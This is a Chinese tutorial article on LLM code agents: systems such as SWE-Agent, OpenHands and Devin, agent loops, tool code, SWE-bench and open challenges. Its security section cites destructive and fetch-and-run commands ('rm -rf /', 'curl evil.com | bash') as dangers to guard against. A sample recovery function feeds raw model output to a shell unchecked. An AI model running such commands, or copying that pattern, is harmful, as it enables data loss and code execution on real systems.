# 代码 Agent：让 LLM 自主完成编程任务

代码 LLM 最初只做"补全"——给定上下文生成下一段代码。但工程师真正的工作是**多步、跨文件、需要工具**的复杂任务：阅读 issue、定位 bug、写修复、跑测试、根据错误迭代。**代码 Agent** 把 LLM 与工具（代码搜索、文件读写、bash、测试运行器）结合，让模型**自主决策**：先做什么、再做什么、错了怎么改。本文梳理代码 Agent 的代表系统（Devin、SWE-Agent、OpenHands、AutoCodeRover），核心架构，评测基准（SWE-bench），以及当前的局限。

## 一、从补全到 Agent 的演化

代码 LLM 的能力阶梯：

```text
Level 1: 代码补全
  给定上下文 → 生成下一段
  例: GitHub Copilot 早期

Level 2: 单轮对话
  描述需求 → 生成整个函数/文件
  例: ChatGPT 代码块

Level 3: 迭代修改
  多轮对话，逐步修改
  例: Cursor Chat

Level 4: 单任务 Agent
  自主完成多步任务（修 bug、加 feature）
  例: SWE-Agent, OpenHands

Level 5: 端到端工程师
  从 issue 描述到 PR 创建的全流程
  例: Devin (Cognition AI)
```

每一级都是**能力飞跃**——但目前 Level 4~5 仍处于早期阶段，成功率较低。

## 二、代码 Agent 的核心架构

```text
┌──────────────────────────────────────────────────────┐
│                    LLM（大脑）                          │
│  - 推理当前状态                                       │
│  - 决定下一步动作                                      │
│  - 评估执行结果                                        │
└──────────────────────────────────────────────────────┘
                            ↕
┌──────────────────────────────────────────────────────┐
│                  Tools（工具集）                        │
│  - bash：执行 shell 命令                                │
│  - file_read / file_write：读写文件                     │
│  - grep / glob：搜索代码                                │
│  - test_runner：运行测试                                │
│  - git：版本控制                                       │
└──────────────────────────────────────────────────────┘
                            ↕
┌──────────────────────────────────────────────────────┐
│              Environment（执行环境）                     │
│  - 隔离的 Docker 容器                                  │
│  - 完整代码仓库                                       │
│  - 测试套件                                           │
└──────────────────────────────────────────────────────┘
```

模型通过**观察-思考-行动**循环推进任务：

```python
def code_agent_loop(llm, env, task, max_steps=50):
    """代码 Agent 的主循环。"""
    history = []
    
    for step in range(max_steps):
        # 1) 模型观察当前状态，决定下一步动作
        action = llm.generate(
            observation=env.observe(),
            history=history,
            task=task,
        )
        
        # 2) 执行动作
        try:
            result = env.step(action)
        except Exception as e:
            result = f"ERROR: {e}"
        
        # 3) 记录历史
        history.append({"action": action, "result": result})
        
        # 4) 检查是否完成
        if env.task_complete():
            return history
    
    return history
```

## 三、代表系统

### 1. SWE-Agent（Princeton, 2024）

最经典的开源代码 Agent，OpenHands 的前身：

```python
class SWEAgent:
    def __init__(self, llm, repo_path, issue):
        self.llm = llm
        self.env = CodeEnv(repo_path)
        self.issue = issue
    
    def run(self):
        # System prompt 设计成"agent 行为指南"
        prompt = f"""You are an expert software engineer.
Repository: {self.env.repo}
Issue: {self.issue}

You have access to tools. Plan and execute step by step.

Available tools:
- bash: Execute shell commands
- file_read: Read a file
- file_edit: Edit a file
- submit: Finish when done

Begin!
"""
        
        # 完整 Agent 循环
        for _ in range(max_steps):
            action = self.llm.generate(prompt + self.env.observation)
            self.env.execute(action)
```

**核心创新**：
- **Agent-Computer Interface（ACI）**：把 LLM 看作"操作员"，工具设计成"易于 LLM 调用"。
- **上下文管理**：自动总结长历史。
- **错误恢复**：bash 失败时给出建议。

### 2. OpenHands（前身 OpenDevin, 2024）

更通用的 Agent 框架，支持**多种 LLM + 多种任务**：

```python
from openhands import Agent

agent = Agent(
    llm="claude-3.5-sonnet",
    tools=["bash", "file_editor", "browser"],
    workspace="/path/to/repo",
)

agent.run("Fix issue #123 in this repository")
```

**特点**：
- 模块化设计（可替换 LLM、工具、环境）。
- 支持 web 任务（与代码任务共享架构）。
- 内置安全策略（防止 agent 破坏系统）。

### 3. AutoCodeRover（National Univ. of Singapore, 2024）

更**结构化**的代码 Agent——把 issue 解决拆成"代码定位 → 修复"两步：

```python
class AutoCodeRover:
    def __init__(self, repo):
        self.repo = repo
        self.locate_step = LocalizationStep(repo)
        self.repair_step = RepairStep(repo)
    
    def fix_issue(self, issue_text):
        # Step 1: 定位相关代码（API、文件、函数）
        locations = self.locate_step.find(issue_text)
        
        # Step 2: 修复
        patch = self.repair_step.repair(issue_text, locations)
        return patch
```

**创新**：
- 用 AST + 程序分析精确定位相关代码。
- 减少检索空间，提升修复成功率。

### 4. Devin（Cognition AI, 2024）

最广为人知的"AI 软件工程师"产品：

```text
Devin 的能力：
- 自带 shell、编辑器、浏览器
- 完整 SWE-bench 评测 13.86% pass@1（2024.03 数据）
- 后续提升到 23%（2024.06）
- 商业化路线：每月 $500 订阅
```

但 Devin 仍是**单一任务 Agent**——不是真正的"端到端工程师"。

### 5. Aider / Continue

轻量级 CLI 工具，让 LLM 在本地仓库上工作：

```bash
$ aider --model claude-3.5-sonnet
Aider v0.50
Repo: /home/user/myproject
Added file1.py to the chat.
Added file2.py to the chat.

> 修复 user 表的索引问题
```

## 四、关键组件详解

### 1. 工具设计（Agent-Computer Interface）

工具是 Agent 的"手脚"——设计决定上限。

**bash 工具**：

```python
def bash_tool(command: str, timeout=30):
    """执行 shell 命令并返回结果。"""
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True,
            timeout=timeout, text=True
        )
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"error": "Command timed out"}
```

**文件读写工具**：

```python
def file_read(path: str, start_line=0, end_line=None) -> str:
    """读文件部分内容。"""
    with open(path) as f:
        lines = f.readlines()
    return "".join(lines[start_line:end_line])


def file_edit(path: str, old_str: str, new_str: str) -> str:
    """精确字符串替换（不依赖行号）。"""
    with open(path) as f:
        content = f.read()
    if old_str not in content:
        return "ERROR: old_str not found"
    new_content = content.replace(old_str, new_str, 1)
    with open(path, "w") as f:
        f.write(new_content)
    return "OK"
```

**代码搜索工具**：

```python
def grep(pattern: str, file_pattern="*", max_results=50) -> list[dict]:
    """搜索代码中的模式。"""
    results = []
    for path in glob(f"**/{file_pattern}", recursive=True):
        with open(path) as f:
            for lineno, line in enumerate(f, 1):
                if re.search(pattern, line):
                    results.append({
                        "file": path,
                        "lineno": lineno,
                        "content": line.strip(),
                    })
                    if len(results) >= max_results:
                        return results
    return results
```

### 2. 上下文管理

Agent 在长任务中**上下文会爆炸**——必须压缩：

```python
def summarize_history(history: list[dict], max_tokens=4000) -> str:
    """用 LLM 总结 Agent 历史。"""
    history_text = "\n".join([
        f"Step {i}: {h['action']}\nResult: {h['result']}"
        for i, h in enumerate(history)
    ])
    
    summary = llm.generate(f"""Summarize the following agent history
in under {max_tokens} tokens. Focus on:
- What has been tried
- What worked / what failed
- Current state

History:
{history_text}

Summary:""")
    return summary
```

### 3. 测试驱动

测试是 Agent 最重要的反馈信号：

```python
def run_tests(repo_path: str, test_files: list[str] = None) -> dict:
    """运行测试套件并返回结果。"""
    cmd = ["pytest", "-v", "--tb=short"]
    if test_files:
        cmd.extend(test_files)
    
    result = subprocess.run(cmd, cwd=repo_path, capture_output=True, text=True)
    
    return {
        "passed": result.stdout.count(" PASSED"),
        "failed": result.stdout.count(" FAILED"),
        "details": result.stdout[-5000:],  # 截取关键信息
        "returncode": result.returncode,
    }
```

Agent 用 test 通过/失败信号**自我修正**——这是 RLVR 思想。

### 4. 错误恢复

bash 命令常失败——Agent 必须能从错误中恢复：

```python
def execute_with_recovery(llm, command):
    """执行命令并让 LLM 分析错误。"""
    result = bash_tool(command)
    
    if result["returncode"] != 0:
        # 让 LLM 分析错误并尝试修复
        analysis = llm.generate(f"""Command failed: {command}
Error: {result['stderr']}

What's the issue and how can I fix it? Provide a corrected command.""")
        return bash_tool(analysis)
    
    return result
```

## 五、评测基准：SWE-bench

### SWE-bench（Princeton, 2024）

**最权威的代码 Agent 评测**：来自真实 GitHub issue。

```python
{
    "instance_id": "django__django-12345",
    "repo": "django/django",
    "issue_text": "Bug in QuerySet.filter() with Q objects...",
    "base_commit": "abc123",
    "patch": "...",          # 真实修复（ground truth）
    "test_patch": "...",     # 测试用例
    "FAIL_TO_PASS": ["test_filter_q"],   # 修复前失败、修复后通过
    "PASS_TO_PASS": [...],   # 一直通过的测试（防止 regression）
}
```

评测流程：

```python
def evaluate_swebench(agent, instance):
    # 1) Agent 修复 → 生成 patch
    agent.reset()
    agent.run(instance["issue_text"])
    pred_patch = agent.generate_patch()
    
    # 2) 应用 patch + 跑测试
    apply_patch(instance["base_commit"], pred_patch)
    run_tests(instance["test_patch"])
    
    # 3) 看 FAIL_TO_PASS 是否都 PASS
    return all_pass_fail_to_pass()
```

### SWE-bench 排行榜（2024.10）

| 系统 | pass@1 |
|---|---|
| **Anthropic Claude 3.5 Sonnet + Agent** | 49% |
| **OpenHands + GPT-4o** | ~30% |
| **SWE-Agent + GPT-4** | 22% |
| **Devin (2024.06)** | 23% |
| **AutoCodeRover + GPT-4** | 30% |
| **RAG + GPT-4 baseline** | 4% |

可见：**Agent > RAG**（4 倍差距），**Claude 3.5 + Agent** 已能解决近一半 issue。

## 六、代码 Agent 的核心挑战

### 1. 长上下文管理

一个 SWE-bench 任务平均需要 **30+ 步**，每步产生 200~500 token——总上下文 **10K~50K token**。

**挑战**：
- 模型"中间遗忘"（lost-in-the-middle）。
- 关键信息被淹没在噪声中。
- 上下文窗口有限。

**缓解**：
- 定期总结历史。
- Rerank 检索结果，让重要信息在前/在后。
- 关键状态外置（写到文件 / 变量）。

### 2. 错误恢复

Agent 常陷入**循环错误**——同一个错误重复尝试：

```python
# 死循环示例
Step 1: Edit file A
Step 2: Run tests → fail
Step 3: Edit file A (similar fix)
Step 4: Run tests → fail
...
```

**缓解**：
- 让模型记录"已尝试过的方法"。
- 检测循环并强制改变策略。
- 提供 hint 让模型重新分析。

### 3. 工具使用的精度

LLM 调用工具时容易**参数错误**：

```python
# 错误调用
bash("cat /home/user/repo")  # 用户路径不存在
file_edit("missing.py", "...", "...")  # 文件不存在

# 应该先检查
```

**缓解**：
- 工具设计成"宽容"（不存在时返回清晰错误）。
- 自动重试 + 错误提示。

### 4. 安全风险

Agent 在**真实系统**上运行 bash 命令——风险大：

```python
# 危险操作
bash("rm -rf /")
bash("curl evil.com | bash")
bash("git push --force")
```

**缓解**：
- **沙箱环境**：Docker 隔离，无网络 / 只读文件系统。
- **命令审计**：危险命令需人类批准。
- **回滚机制**：所有修改可回滚。

### 5. 经济成本

一次完整任务可能消耗 **$5~$50** API 费用——对低成本用户不划算。

**缓解**：
- 用小模型（Llama 3.1 8B）做简单步骤，大模型做关键决策。
- 缓存工具结果。
- 控制 max_steps。

## 七、设计模式

### 1. ReAct（Reasoning + Acting）

```text
Thought: I need to find the buggy function first.
Action: grep("UserController", file_pattern="*.py")
Observation: Found in src/controllers/user_controller.py:42
Thought: Let me read the file.
Action: file_read("src/controllers/user_controller.py", start_line=42, end_line=80)
...
```

### 2. Plan-and-Execute

```python
# 先规划
plan = llm.generate(f"Plan to solve: {task}")
# ["step 1", "step 2", ...]

# 执行
for step in plan:
    result = execute(step)
```

**优势**：让 LLM 先全局思考，避免"走一步看一步"。

### 3. Multi-Agent

多个 Agent 协作：

```python
# 主 Agent + 专家 Agent
explorer = Agent("explore codebase")
fixer = Agent("write fix")
tester = Agent("run tests and report")

explorer_report = explorer.run(task)
fix = fixer.run(f"{task}\n{explorer_report}")
test_result = tester.run(f"{fix}")
```

**研究问题**：专家 Agent 是否真的更优？还是只是计算开销？

## 八、工程实践

### 1. 配置示例：SWE-Agent 跑 SWE-bench

```bash
# 1) 安装
pip install swe-agent

# 2) 配置环境变量
export OPENAI_API_KEY=...
export GITHUB_TOKEN=...

# 3) 跑评测
python -m sweagent.run \
    --model_name gpt-4o \
    --instance_path swebench/data/instances.jsonl \
    --output_dir ./results
```

### 2. 自定义任务

```python
from sweagent import Agent

agent = Agent.from_config({
    "model": "claude-3-5-sonnet-20241022",
    "tools": ["bash", "file_editor"],
    "workspace": "/path/to/repo",
    "max_steps": 100,
})

agent.run("Add a new API endpoint /users/{id}/posts that returns the user's posts.")
```

## 九、未来方向

### 1. 多模态 Agent

- 截图 → UI 代码（前端 Agent）。
- 读设计稿（PNG/Sketch）→ 实现。

### 2. 长生命周期 Agent

- 跨越多个 session 的"工程记忆"。
- 理解团队的代码风格与历史决策。

### 3. 协作 Agent

- 多 Agent 协作（产品经理 Agent + 工程师 Agent + 测试 Agent）。
- Agent + 人类协作（pair programming）。

### 4. 端到端 DevOps

- 不只是修 bug，而是从需求到部署全流程。
- 包括写文档、PR 描述、CI/CD 配置。

### 5. 自我改进

- Agent 从自己的失败中学习。
- 用过往 trace 训练下一代 Agent。

## 十、给工程团队的清单

1. **明确 Agent 范围**：从窄任务开始（修 bug / 加 feature），不要直接做"全栈工程师"。
2. **沙箱安全**：每次 Agent 运行都用干净 Docker。
3. **限制权限**：bash 命令白名单，文件系统只读 / 限制写。
4. **人工审核**：Agent 生成的 patch 必须 review。
5. **可观测性**：记录所有 action、observation，便于回溯。
6. **成本控制**：设置 max_steps、max_tokens、cost ceiling。
7. **错误监控**：检测循环、超时、异常。
8. **评估基准**：自建回归测试集，定期评估。

## 小结

代码 Agent 是代码 LLM 的下一阶段——**从"补全"到"自主完成多步任务"**。SWE-Agent、OpenHands、Devin 等代表系统已经在 SWE-bench 上达到 30~50% 成功率，但与"真正替代工程师"还有距离。**核心挑战是长上下文、错误恢复、安全风险与成本**。**未来是多模态、协作、自我改进**——但短期内**Agent + 人工**的混合模式是主流。这三篇文章覆盖了 ai-for-code 的核心：LLM 补全、RAG 增强、Agent 自主。下一篇我们将转向 **ai-for-education**：AI 如何变革学习与教学。
